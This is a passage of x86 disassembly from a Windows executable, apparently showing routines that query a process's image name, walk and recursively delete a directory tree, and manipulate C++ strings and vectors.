  40f0eb:	ff 75 08             	push   0x8(%ebp)
  40f0ee:	6a 00                	push   $0x0
  40f0f0:	68 00 04 00 00       	push   $0x400
  40f0f5:	ff 15 14 01 41 00    	call   *0x410114
  40f0fb:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40f0fe:	51                   	push   %ecx
  40f0ff:	50                   	push   %eax
  40f100:	ff 15 94 5b 41 00    	call   *0x415b94
  40f106:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40f10a:	75 04                	jne    0x40f110
  40f10c:	b0 01                	mov    $0x1,%al
  40f10e:	5d                   	pop    %ebp
  40f10f:	c3                   	ret
  40f110:	32 c0                	xor    %al,%al
  40f112:	5d                   	pop    %ebp
  40f113:	c3                   	ret
  40f114:	55                   	push   %ebp
  40f115:	8b ec                	mov    %esp,%ebp
  40f117:	81 ec 04 01 00 00    	sub    $0x104,%esp
  40f11d:	ff 75 0c             	push   0xc(%ebp)
  40f120:	6a 00                	push   $0x0
  40f122:	68 10 04 00 00       	push   $0x410
  40f127:	ff 15 14 01 41 00    	call   *0x410114
  40f12d:	8d 8d fc fe ff ff    	lea    -0x104(%ebp),%ecx
  40f133:	68 04 01 00 00       	push   $0x104
  40f138:	51                   	push   %ecx
  40f139:	6a 00                	push   $0x0
  40f13b:	50                   	push   %eax
  40f13c:	ff 15 2c 59 41 00    	call   *0x41592c
  40f142:	85 c0                	test   %eax,%eax
  40f144:	75 0b                	jne    0x40f151
  40f146:	8d 45 0f             	lea    0xf(%ebp),%eax
  40f149:	50                   	push   %eax
  40f14a:	68 68 06 41 00       	push   $0x410668
  40f14f:	eb 0b                	jmp    0x40f15c
  40f151:	8d 45 0f             	lea    0xf(%ebp),%eax
  40f154:	50                   	push   %eax
  40f155:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  40f15b:	50                   	push   %eax
  40f15c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40f15f:	ff 15 4c 02 41 00    	call   *0x41024c
  40f165:	8b 45 08             	mov    0x8(%ebp),%eax
  40f168:	c9                   	leave
  40f169:	c3                   	ret
  40f16a:	55                   	push   %ebp
  40f16b:	8b ec                	mov    %esp,%ebp
  40f16d:	81 ec 08 02 00 00    	sub    $0x208,%esp
  40f173:	ff 75 0c             	push   0xc(%ebp)
  40f176:	6a 00                	push   $0x0
  40f178:	68 10 04 00 00       	push   $0x410
  40f17d:	ff 15 14 01 41 00    	call   *0x410114
  40f183:	8d 8d f8 fd ff ff    	lea    -0x208(%ebp),%ecx
  40f189:	68 08 02 00 00       	push   $0x208
  40f18e:	51                   	push   %ecx
  40f18f:	6a 00                	push   $0x0
  40f191:	50                   	push   %eax
  40f192:	ff 15 28 59 41 00    	call   *0x415928
  40f198:	85 c0                	test   %eax,%eax
  40f19a:	75 0b                	jne    0x40f1a7
  40f19c:	8d 45 0f             	lea    0xf(%ebp),%eax
  40f19f:	50                   	push   %eax
  40f1a0:	68 a4 18 41 00       	push   $0x4118a4
  40f1a5:	eb 0b                	jmp    0x40f1b2
  40f1a7:	8d 45 0f             	lea    0xf(%ebp),%eax
  40f1aa:	50                   	push   %eax
  40f1ab:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
  40f1b1:	50                   	push   %eax
  40f1b2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40f1b5:	ff 15 bc 02 41 00    	call   *0x4102bc
  40f1bb:	8b 45 08             	mov    0x8(%ebp),%eax
  40f1be:	c9                   	leave
  40f1bf:	c3                   	ret
  40f1c0:	55                   	push   %ebp
  40f1c1:	8b ec                	mov    %esp,%ebp
  40f1c3:	8b 45 08             	mov    0x8(%ebp),%eax
  40f1c6:	56                   	push   %esi
  40f1c7:	be d8 08 41 00       	mov    $0x4108d8,%esi
  40f1cc:	8a 10                	mov    (%eax),%dl
  40f1ce:	8a ca                	mov    %dl,%cl
  40f1d0:	3a 16                	cmp    (%esi),%dl
  40f1d2:	75 1a                	jne    0x40f1ee
  40f1d4:	84 c9                	test   %cl,%cl
  40f1d6:	74 12                	je     0x40f1ea
  40f1d8:	8a 50 01             	mov    0x1(%eax),%dl
  40f1db:	8a ca                	mov    %dl,%cl
  40f1dd:	3a 56 01             	cmp    0x1(%esi),%dl
  40f1e0:	75 0c                	jne    0x40f1ee
  40f1e2:	40                   	inc    %eax
  40f1e3:	40                   	inc    %eax
  40f1e4:	46                   	inc    %esi
  40f1e5:	46                   	inc    %esi
  40f1e6:	84 c9                	test   %cl,%cl
  40f1e8:	75 e2                	jne    0x40f1cc
  40f1ea:	33 c0                	xor    %eax,%eax
  40f1ec:	eb 05                	jmp    0x40f1f3
  40f1ee:	1b c0                	sbb    %eax,%eax
  40f1f0:	83 d8 ff             	sbb    $0xffffffff,%eax
  40f1f3:	85 c0                	test   %eax,%eax
  40f1f5:	74 37                	je     0x40f22e
  40f1f7:	8b 45 08             	mov    0x8(%ebp),%eax
  40f1fa:	be 1c 0c 41 00       	mov    $0x410c1c,%esi
  40f1ff:	8a 10                	mov    (%eax),%dl
  40f201:	8a ca                	mov    %dl,%cl
  40f203:	3a 16                	cmp    (%esi),%dl
  40f205:	75 1a                	jne    0x40f221
  40f207:	84 c9                	test   %cl,%cl
  40f209:	74 12                	je     0x40f21d
  40f20b:	8a 50 01             	mov    0x1(%eax),%dl
  40f20e:	8a ca                	mov    %dl,%cl
  40f210:	3a 56 01             	cmp    0x1(%esi),%dl
  40f213:	75 0c                	jne    0x40f221
  40f215:	40                   	inc    %eax
  40f216:	40                   	inc    %eax
  40f217:	46                   	inc    %esi
  40f218:	46                   	inc    %esi
  40f219:	84 c9                	test   %cl,%cl
  40f21b:	75 e2                	jne    0x40f1ff
  40f21d:	33 c0                	xor    %eax,%eax
  40f21f:	eb 05                	jmp    0x40f226
  40f221:	1b c0                	sbb    %eax,%eax
  40f223:	83 d8 ff             	sbb    $0xffffffff,%eax
  40f226:	85 c0                	test   %eax,%eax
  40f228:	74 04                	je     0x40f22e
  40f22a:	33 c0                	xor    %eax,%eax
  40f22c:	eb 03                	jmp    0x40f231
  40f22e:	6a 01                	push   $0x1
  40f230:	58                   	pop    %eax
  40f231:	5e                   	pop    %esi
  40f232:	5d                   	pop    %ebp
  40f233:	c3                   	ret
  40f234:	55                   	push   %ebp
  40f235:	8b ec                	mov    %esp,%ebp
  40f237:	81 ec 50 03 00 00    	sub    $0x350,%esp
  40f23d:	53                   	push   %ebx
  40f23e:	56                   	push   %esi
  40f23f:	83 cb ff             	or     $0xffffffff,%ebx
  40f242:	57                   	push   %edi
  40f243:	8b 7d 08             	mov    0x8(%ebp),%edi
  40f246:	8b cb                	mov    %ebx,%ecx
  40f248:	33 c0                	xor    %eax,%eax
  40f24a:	8d 95 f0 fd ff ff    	lea    -0x210(%ebp),%edx
  40f250:	f2 ae                	repnz scas %es:(%edi),%al
  40f252:	f7 d1                	not    %ecx
  40f254:	2b f9                	sub    %ecx,%edi
  40f256:	8b c1                	mov    %ecx,%eax
  40f258:	8b f7                	mov    %edi,%esi
  40f25a:	c1 e9 02             	shr    $0x2,%ecx
  40f25d:	8b fa                	mov    %edx,%edi
  40f25f:	8d 95 f0 fd ff ff    	lea    -0x210(%ebp),%edx
  40f265:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40f267:	8b c8                	mov    %eax,%ecx
  40f269:	33 c0                	xor    %eax,%eax
  40f26b:	83 e1 03             	and    $0x3,%ecx
  40f26e:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40f270:	bf b0 14 41 00       	mov    $0x4114b0,%edi
  40f275:	8b cb                	mov    %ebx,%ecx
  40f277:	f2 ae                	repnz scas %es:(%edi),%al
  40f279:	f7 d1                	not    %ecx
  40f27b:	2b f9                	sub    %ecx,%edi
  40f27d:	8b f7                	mov    %edi,%esi
  40f27f:	8b fa                	mov    %edx,%edi
  40f281:	8b d1                	mov    %ecx,%edx
  40f283:	8b cb                	mov    %ebx,%ecx
  40f285:	f2 ae                	repnz scas %es:(%edi),%al
  40f287:	8b ca                	mov    %edx,%ecx
  40f289:	4f                   	dec    %edi
  40f28a:	c1 e9 02             	shr    $0x2,%ecx
  40f28d:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40f28f:	8b ca                	mov    %edx,%ecx
  40f291:	8d 95 f4 fe ff ff    	lea    -0x10c(%ebp),%edx
  40f297:	83 e1 03             	and    $0x3,%ecx
  40f29a:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40f29c:	8b 7d 08             	mov    0x8(%ebp),%edi
  40f29f:	8b cb                	mov    %ebx,%ecx
  40f2a1:	f2 ae                	repnz scas %es:(%edi),%al
  40f2a3:	f7 d1                	not    %ecx
  40f2a5:	2b f9                	sub    %ecx,%edi
  40f2a7:	8b c1                	mov    %ecx,%eax
  40f2a9:	8b f7                	mov    %edi,%esi
  40f2ab:	8b fa                	mov    %edx,%edi
  40f2ad:	8d 95 f4 fe ff ff    	lea    -0x10c(%ebp),%edx
  40f2b3:	c1 e9 02             	shr    $0x2,%ecx
  40f2b6:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40f2b8:	8b c8                	mov    %eax,%ecx
  40f2ba:	33 c0                	xor    %eax,%eax
  40f2bc:	83 e1 03             	and    $0x3,%ecx
  40f2bf:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40f2c1:	bf cc 08 41 00       	mov    $0x4108cc,%edi
  40f2c6:	8b cb                	mov    %ebx,%ecx
  40f2c8:	f2 ae                	repnz scas %es:(%edi),%al
  40f2ca:	f7 d1                	not    %ecx
  40f2cc:	2b f9                	sub    %ecx,%edi
  40f2ce:	8b f7                	mov    %edi,%esi
  40f2d0:	8b fa                	mov    %edx,%edi
  40f2d2:	8b d1                	mov    %ecx,%edx
  40f2d4:	8b cb                	mov    %ebx,%ecx
  40f2d6:	f2 ae                	repnz scas %es:(%edi),%al
  40f2d8:	8b ca                	mov    %edx,%ecx
  40f2da:	4f                   	dec    %edi
  40f2db:	c1 e9 02             	shr    $0x2,%ecx
  40f2de:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40f2e0:	8d 85 b0 fc ff ff    	lea    -0x350(%ebp),%eax
  40f2e6:	8b ca                	mov    %edx,%ecx
  40f2e8:	50                   	push   %eax
  40f2e9:	83 e1 03             	and    $0x3,%ecx
  40f2ec:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  40f2f2:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40f2f4:	50                   	push   %eax
  40f2f5:	ff 15 34 01 41 00    	call   *0x410134
  40f2fb:	3b c3                	cmp    %ebx,%eax
  40f2fd:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40f300:	0f 84 42 01 00 00    	je     0x40f448
  40f306:	8d bd f4 fe ff ff    	lea    -0x10c(%ebp),%edi
  40f30c:	8b cb                	mov    %ebx,%ecx
  40f30e:	33 c0                	xor    %eax,%eax
  40f310:	8d 95 f0 fd ff ff    	lea    -0x210(%ebp),%edx
  40f316:	f2 ae                	repnz scas %es:(%edi),%al
  40f318:	f7 d1                	not    %ecx
  40f31a:	2b f9                	sub    %ecx,%edi
  40f31c:	c6 45 ff 01          	movb   $0x1,-0x1(%ebp)
  40f320:	8b c1                	mov    %ecx,%eax
  40f322:	8b f7                	mov    %edi,%esi
  40f324:	8b fa                	mov    %edx,%edi
  40f326:	c1 e9 02             	shr    $0x2,%ecx
  40f329:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40f32b:	8b c8                	mov    %eax,%ecx
  40f32d:	83 e1 03             	and    $0x3,%ecx
  40f330:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40f332:	8d 85 b0 fc ff ff    	lea    -0x350(%ebp),%eax
  40f338:	50                   	push   %eax
  40f339:	ff 75 f8             	push   -0x8(%ebp)
  40f33c:	ff 15 38 01 41 00    	call   *0x410138
  40f342:	85 c0                	test   %eax,%eax
  40f344:	0f 84 c5 00 00 00    	je     0x40f40f
  40f34a:	8d 85 dc fc ff ff    	lea    -0x324(%ebp),%eax
  40f350:	50                   	push   %eax
  40f351:	e8 6a fe ff ff       	call   0x40f1c0
  40f356:	85 c0                	test   %eax,%eax
  40f358:	59                   	pop    %ecx
  40f359:	0f 85 bf 00 00 00    	jne    0x40f41e
  40f35f:	8d bd dc fc ff ff    	lea    -0x324(%ebp),%edi
  40f365:	8b cb                	mov    %ebx,%ecx
  40f367:	f2 ae                	repnz scas %es:(%edi),%al
  40f369:	f7 d1                	not    %ecx
  40f36b:	2b f9                	sub    %ecx,%edi
  40f36d:	8d 95 f4 fe ff ff    	lea    -0x10c(%ebp),%edx
  40f373:	8b f7                	mov    %edi,%esi
  40f375:	8b fa                	mov    %edx,%edi
  40f377:	8b d1                	mov    %ecx,%edx
  40f379:	8b cb                	mov    %ebx,%ecx
  40f37b:	f2 ae                	repnz scas %es:(%edi),%al
  40f37d:	8b ca                	mov    %edx,%ecx
  40f37f:	4f                   	dec    %edi
  40f380:	c1 e9 02             	shr    $0x2,%ecx
  40f383:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40f385:	8b ca                	mov    %edx,%ecx
  40f387:	83 e1 03             	and    $0x3,%ecx
  40f38a:	f6 85 b0 fc ff ff 10 	testb  $0x10,-0x350(%ebp)
  40f391:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40f393:	74 4c                	je     0x40f3e1
  40f395:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  40f39b:	50                   	push   %eax
  40f39c:	e8 93 fe ff ff       	call   0x40f234
  40f3a1:	85 c0                	test   %eax,%eax
  40f3a3:	59                   	pop    %ecx
  40f3a4:	0f 84 95 00 00 00    	je     0x40f43f
  40f3aa:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  40f3b0:	50                   	push   %eax
  40f3b1:	ff 15 54 01 41 00    	call   *0x410154
  40f3b7:	8d bd f0 fd ff ff    	lea    -0x210(%ebp),%edi
  40f3bd:	8b cb                	mov    %ebx,%ecx
  40f3bf:	33 c0                	xor    %eax,%eax
  40f3c1:	8d 95 f4 fe ff ff    	lea    -0x10c(%ebp),%edx
  40f3c7:	f2 ae                	repnz scas %es:(%edi),%al
  40f3c9:	f7 d1                	not    %ecx
  40f3cb:	2b f9                	sub    %ecx,%edi
  40f3cd:	8b c1                	mov    %ecx,%eax
  40f3cf:	8b f7                	mov    %edi,%esi
  40f3d1:	8b fa                	mov    %edx,%edi
  40f3d3:	c1 e9 02             	shr    $0x2,%ecx
  40f3d6:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40f3d8:	8b c8                	mov    %eax,%ecx
  40f3da:	83 e1 03             	and    $0x3,%ecx
  40f3dd:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40f3df:	eb 3d                	jmp    0x40f41e
  40f3e1:	f6 85 b0 fc ff ff 01 	testb  $0x1,-0x350(%ebp)
  40f3e8:	74 12                	je     0x40f3fc
  40f3ea:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  40f3f0:	68 80 00 00 00       	push   $0x80
  40f3f5:	50                   	push   %eax
  40f3f6:	ff 15 60 01 41 00    	call   *0x410160
  40f3fc:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  40f402:	50                   	push   %eax
  40f403:	ff 15 50 01 41 00    	call   *0x410150
  40f409:	85 c0                	test   %eax,%eax
  40f40b:	74 32                	je     0x40f43f
  40f40d:	eb a8                	jmp    0x40f3b7
  40f40f:	ff 15 3c 01 41 00    	call   *0x41013c
  40f415:	83 f8 12             	cmp    $0x12,%eax
  40f418:	75 25                	jne    0x40f43f
  40f41a:	80 65 ff 00          	andb   $0x0,-0x1(%ebp)
  40f41e:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
  40f422:	0f 85 0a ff ff ff    	jne    0x40f332
  40f428:	ff 75 f8             	push   -0x8(%ebp)
  40f42b:	ff 15 74 01 41 00    	call   *0x410174
  40f431:	ff 75 08             	push   0x8(%ebp)
  40f434:	ff 15 54 01 41 00    	call   *0x410154
  40f43a:	5f                   	pop    %edi
  40f43b:	5e                   	pop    %esi
  40f43c:	5b                   	pop    %ebx
  40f43d:	c9                   	leave
  40f43e:	c3                   	ret
  40f43f:	ff 75 f8             	push   -0x8(%ebp)
  40f442:	ff 15 74 01 41 00    	call   *0x410174
  40f448:	33 c0                	xor    %eax,%eax
  40f44a:	eb ee                	jmp    0x40f43a
  40f44c:	55                   	push   %ebp
  40f44d:	8b ec                	mov    %esp,%ebp
  40f44f:	81 ec 90 00 00 00    	sub    $0x90,%esp
  40f455:	6a 01                	push   $0x1
  40f457:	6a 01                	push   $0x1
  40f459:	ff 75 08             	push   0x8(%ebp)
  40f45c:	8d 8d 70 ff ff ff    	lea    -0x90(%ebp),%ecx
  40f462:	ff 15 f4 02 41 00    	call   *0x4102f4
  40f468:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  40f46e:	85 c0                	test   %eax,%eax
  40f470:	75 04                	jne    0x40f476
  40f472:	33 c9                	xor    %ecx,%ecx
  40f474:	eb 10                	jmp    0x40f486
  40f476:	8b 85 70 ff ff ff    	mov    -0x90(%ebp),%eax
  40f47c:	8b 40 04             	mov    0x4(%eax),%eax
  40f47f:	8d 8c 05 70 ff ff ff 	lea    -0x90(%ebp,%eax,1),%ecx
  40f486:	53                   	push   %ebx
  40f487:	ff 15 14 02 41 00    	call   *0x410214
  40f48d:	85 c0                	test   %eax,%eax
  40f48f:	8d 8d 70 ff ff ff    	lea    -0x90(%ebp),%ecx
  40f495:	0f 95 c3             	setne  %bl
  40f498:	ff 15 dc 02 41 00    	call   *0x4102dc
  40f49e:	8a c3                	mov    %bl,%al
  40f4a0:	5b                   	pop    %ebx
  40f4a1:	c9                   	leave
  40f4a2:	c3                   	ret
  40f4a3:	55                   	push   %ebp
  40f4a4:	8b ec                	mov    %esp,%ebp
  40f4a6:	83 ec 24             	sub    $0x24,%esp
  40f4a9:	56                   	push   %esi
  40f4aa:	57                   	push   %edi
  40f4ab:	ff 15 e0 03 41 00    	call   *0x4103e0
  40f4b1:	8b f0                	mov    %eax,%esi
  40f4b3:	56                   	push   %esi
  40f4b4:	ff 15 dc 03 41 00    	call   *0x4103dc
  40f4ba:	85 c0                	test   %eax,%eax
  40f4bc:	0f 86 d1 00 00 00    	jbe    0x40f593
  40f4c2:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  40f4c5:	40                   	inc    %eax
  40f4c6:	51                   	push   %ecx
  40f4c7:	6a 00                	push   $0x0
  40f4c9:	50                   	push   %eax
  40f4ca:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40f4cd:	ff 15 24 02 41 00    	call   *0x410224
  40f4d3:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40f4d6:	ff 15 a0 02 41 00    	call   *0x4102a0
  40f4dc:	50                   	push   %eax
  40f4dd:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40f4e0:	ff 15 58 02 41 00    	call   *0x410258
  40f4e6:	50                   	push   %eax
  40f4e7:	56                   	push   %esi
  40f4e8:	ff 15 14 04 41 00    	call   *0x410414
  40f4ee:	ff 35 6c 03 41 00    	push   0x41036c
  40f4f4:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40f4f7:	ff 15 a0 01 41 00    	call   *0x4101a0
  40f4fd:	50                   	push   %eax
  40f4fe:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40f501:	ff 15 a4 01 41 00    	call   *0x4101a4
  40f507:	50                   	push   %eax
  40f508:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40f50b:	ff 15 a0 01 41 00    	call   *0x4101a0
  40f511:	50                   	push   %eax
  40f512:	e8 50 91 ff ff       	call   0x408667
  40f517:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40f51a:	8b cc                	mov    %esp,%ecx
  40f51c:	50                   	push   %eax
  40f51d:	68 ac 08 41 00       	push   $0x4108ac
  40f522:	ff 15 4c 02 41 00    	call   *0x41024c
  40f528:	83 ec 10             	sub    $0x10,%esp
  40f52b:	8d 45 08             	lea    0x8(%ebp),%eax
  40f52e:	8b cc                	mov    %esp,%ecx
  40f530:	50                   	push   %eax
  40f531:	ff 15 60 02 41 00    	call   *0x410260
  40f537:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40f53a:	50                   	push   %eax
  40f53b:	e8 75 fa ff ff       	call   0x40efb5
  40f540:	83 c4 24             	add    $0x24,%esp
  40f543:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40f546:	33 ff                	xor    %edi,%edi
  40f548:	e8 68 1d ff ff       	call   0x4012b5
  40f54d:	85 c0                	test   %eax,%eax
  40f54f:	76 31                	jbe    0x40f582
  40f551:	33 f6                	xor    %esi,%esi
  40f553:	6a 00                	push   $0x0
  40f555:	56                   	push   %esi
  40f556:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40f559:	e8 2b 1d ff ff       	call   0x401289
  40f55e:	50                   	push   %eax
  40f55f:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40f562:	ff 15 ec 01 41 00    	call   *0x4101ec
  40f568:	8b 0d 9c 02 41 00    	mov    0x41029c,%ecx
  40f56e:	3b 01                	cmp    (%ecx),%eax
  40f570:	75 30                	jne    0x40f5a2
  40f572:	47                   	inc    %edi
  40f573:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40f576:	0f b7 f7             	movzwl %di,%esi
  40f579:	e8 37 1d ff ff       	call   0x4012b5
  40f57e:	3b f0                	cmp    %eax,%esi
  40f580:	72 d1                	jb     0x40f553
  40f582:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40f585:	e8 b2 25 ff ff       	call   0x401b3c
  40f58a:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40f58d:	ff 15 54 02 41 00    	call   *0x410254
  40f593:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40f596:	ff 15 54 02 41 00    	call   *0x410254
  40f59c:	32 c0                	xor    %al,%al
  40f59e:	5f                   	pop    %edi
  40f59f:	5e                   	pop    %esi
  40f5a0:	c9                   	leave
  40f5a1:	c3                   	ret
  40f5a2:	83 7d 18 00          	cmpl   $0x0,0x18(%ebp)
  40f5a6:	74 29                	je     0x40f5d1
  40f5a8:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40f5ab:	ff 15 58 02 41 00    	call   *0x410258
  40f5b1:	8b f8                	mov    %eax,%edi
  40f5b3:	83 c9 ff             	or     $0xffffffff,%ecx
  40f5b6:	33 c0                	xor    %eax,%eax
  40f5b8:	f2 ae                	repnz scas %es:(%edi),%al
  40f5ba:	f7 d1                	not    %ecx
  40f5bc:	2b f9                	sub    %ecx,%edi
  40f5be:	8b c1                	mov    %ecx,%eax
  40f5c0:	8b f7                	mov    %edi,%esi
  40f5c2:	8b 7d 18             	mov    0x18(%ebp),%edi
  40f5c5:	c1 e9 02             	shr    $0x2,%ecx
  40f5c8:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40f5ca:	8b c8                	mov    %eax,%ecx
  40f5cc:	83 e1 03             	and    $0x3,%ecx
  40f5cf:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40f5d1:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40f5d4:	e8 63 25 ff ff       	call   0x401b3c
  40f5d9:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40f5dc:	ff 15 54 02 41 00    	call   *0x410254
  40f5e2:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40f5e5:	ff 15 54 02 41 00    	call   *0x410254
  40f5eb:	b0 01                	mov    $0x1,%al
  40f5ed:	eb af                	jmp    0x40f59e
  40f5ef:	55                   	push   %ebp
  40f5f0:	8b ec                	mov    %esp,%ebp
  40f5f2:	56                   	push   %esi
  40f5f3:	57                   	push   %edi
  40f5f4:	8b 7d 08             	mov    0x8(%ebp),%edi
  40f5f7:	8b f1                	mov    %ecx,%esi
  40f5f9:	6a 00                	push   $0x0
  40f5fb:	8b cf                	mov    %edi,%ecx
  40f5fd:	8a 07                	mov    (%edi),%al
  40f5ff:	88 06                	mov    %al,(%esi)
  40f601:	e8 af 1c ff ff       	call   0x4012b5
  40f606:	50                   	push   %eax
  40f607:	8b ce                	mov    %esi,%ecx
  40f609:	e8 a7 25 ff ff       	call   0x401bb5
  40f60e:	50                   	push   %eax
  40f60f:	8b cf                	mov    %edi,%ecx
  40f611:	89 46 04             	mov    %eax,0x4(%esi)
  40f614:	e8 1e 90 ff ff       	call   0x408637
  40f619:	50                   	push   %eax
  40f61a:	8b cf                	mov    %edi,%ecx
  40f61c:	e8 12 90 ff ff       	call   0x408633
  40f621:	50                   	push   %eax
  40f622:	8b ce                	mov    %esi,%ecx
  40f624:	e8 12 90 ff ff       	call   0x40863b
  40f629:	89 46 08             	mov    %eax,0x8(%esi)
  40f62c:	89 46 0c             	mov    %eax,0xc(%esi)
  40f62f:	8b c6                	mov    %esi,%eax
  40f631:	5f                   	pop    %edi
  40f632:	5e                   	pop    %esi
  40f633:	5d                   	pop    %ebp
  40f634:	c2 04 00             	ret    $0x4
  40f637:	55                   	push   %ebp
  40f638:	8b ec                	mov    %esp,%ebp
  40f63a:	56                   	push   %esi
  40f63b:	8b f1                	mov    %ecx,%esi
  40f63d:	ff 75 08             	push   0x8(%ebp)
  40f640:	e8 f2 8f ff ff       	call   0x408637
  40f645:	50                   	push   %eax
  40f646:	8b ce                	mov    %esi,%ecx
  40f648:	e8 05 00 00 00       	call   0x40f652
  40f64d:	5e                   	pop    %esi
  40f64e:	5d                   	pop    %ebp
  40f64f:	c2 04 00             	ret    $0x4
  40f652:	55                   	push   %ebp
  40f653:	8b ec                	mov    %esp,%ebp
  40f655:	56                   	push   %esi
  40f656:	57                   	push   %edi
  40f657:	8b f9                	mov    %ecx,%edi
  40f659:	e8 d5 8f ff ff       	call   0x408633
  40f65e:	ff 75 0c             	push   0xc(%ebp)
  40f661:	8b 75 08             	mov    0x8(%ebp),%esi
  40f664:	2b f0                	sub    %eax,%esi
  40f666:	8b cf                	mov    %edi,%ecx
  40f668:	6a 01                	push   $0x1
  40f66a:	ff 75 08             	push   0x8(%ebp)
  40f66d:	c1 fe 04             	sar    $0x4,%esi
  40f670:	e8 12 00 00 00       	call   0x40f687
  40f675:	8b cf                	mov    %edi,%ecx
  40f677:	e8 b7 8f ff ff       	call   0x408633
  40f67c:	c1 e6 04             	shl    $0x4,%esi
  40f67f:	03 c6                	add    %esi,%eax
  40f681:	5f                   	pop    %edi
  40f682:	5e                   	pop    %esi
  40f683:	5d                   	pop    %ebp
  40f684:	c2 08 00             	ret    $0x8
  40f687:	55                   	push   %ebp
  40f688:	8b ec                	mov    %esp,%ebp
  40f68a:	51                   	push   %ecx
  40f68b:	53                   	push   %ebx
  40f68c:	56                   	push   %esi
  40f68d:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  40f690:	8b f1                	mov    %ecx,%esi
  40f692:	57                   	push   %edi
  40f693:	8b 46 08             	mov    0x8(%esi),%eax
  40f696:	8b 4e 0c             	mov    0xc(%esi),%ecx
  40f699:	2b c8                	sub    %eax,%ecx
  40f69b:	c1 f9 04             	sar    $0x4,%ecx
  40f69e:	3b cb                	cmp    %ebx,%ecx
  40f6a0:	0f 83 ae 00 00 00    	jae    0x40f754
  40f6a6:	8b ce                	mov    %esi,%ecx
  40f6a8:	e8 08 1c ff ff       	call   0x4012b5
  40f6ad:	3b d8                	cmp    %eax,%ebx
  40f6af:	73 0c                	jae    0x40f6bd
  40f6b1:	8b ce                	mov    %esi,%ecx
  40f6b3:	e8 fd 1b ff ff       	call   0x4012b5
  40f6b8:	89 45 0c             	mov    %eax,0xc(%ebp)
  40f6bb:	eb 03                	jmp    0x40f6c0
  40f6bd:	89 5d 0c             	mov    %ebx,0xc(%ebp)
  40f6c0:	8b ce                	mov    %esi,%ecx
  40f6c2:	e8 ee 1b ff ff       	call   0x4012b5
  40f6c7:	8b f8                	mov    %eax,%edi
  40f6c9:	6a 00                	push   $0x0
  40f6cb:	03 7d 0c             	add    0xc(%ebp),%edi
  40f6ce:	8b ce                	mov    %esi,%ecx
  40f6d0:	57                   	push   %edi
  40f6d1:	e8 df 24 ff ff       	call   0x401bb5
  40f6d6:	50                   	push   %eax
  40f6d7:	8b ce                	mov    %esi,%ecx
  40f6d9:	ff 75 08             	push   0x8(%ebp)
  40f6dc:	89 45 0c             	mov    %eax,0xc(%ebp)
  40f6df:	ff 76 04             	push   0x4(%esi)
  40f6e2:	e8 54 8f ff ff       	call   0x40863b
  40f6e7:	ff 75 10             	push   0x10(%ebp)
  40f6ea:	8b ce                	mov    %esi,%ecx
  40f6ec:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40f6ef:	53                   	push   %ebx
  40f6f0:	50                   	push   %eax
  40f6f1:	e8 97 24 ff ff       	call   0x401b8d
  40f6f6:	8b c3                	mov    %ebx,%eax
  40f6f8:	8b ce                	mov    %esi,%ecx
  40f6fa:	c1 e0 04             	shl    $0x4,%eax
  40f6fd:	03 45 fc             	add    -0x4(%ebp),%eax
  40f700:	50                   	push   %eax
  40f701:	ff 76 08             	push   0x8(%esi)
  40f704:	ff 75 08             	push   0x8(%ebp)
  40f707:	e8 2f 8f ff ff       	call   0x40863b
  40f70c:	ff 76 08             	push   0x8(%esi)
  40f70f:	8b ce                	mov    %esi,%ecx
  40f711:	ff 76 04             	push   0x4(%esi)
  40f714:	e8 52 24 ff ff       	call   0x401b6b
  40f719:	8b 46 04             	mov    0x4(%esi),%eax
  40f71c:	8b 4e 0c             	mov    0xc(%esi),%ecx
  40f71f:	2b c8                	sub    %eax,%ecx
